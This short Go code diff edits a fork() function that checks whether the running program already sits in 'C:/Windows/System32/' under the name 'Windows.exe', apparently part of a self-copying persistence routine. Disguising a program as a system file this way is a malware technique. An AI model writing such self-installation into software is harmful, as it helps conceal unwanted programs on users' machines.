@@ -16,6 +16,7 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"syscall"
@@ -328,7 +329,7 @@ func fork() {
 	dst := "C:/Windows/System32/"
 	dstFileName := "Windows.exe"
 	fmt.Println(src)
-	if strings.HasPrefix(dst, src) { //如果运行程序就在指定目录
+	if src == dst[:len(dst)-1] { //如果运行程序就在指定目录
 		return
 	}
 
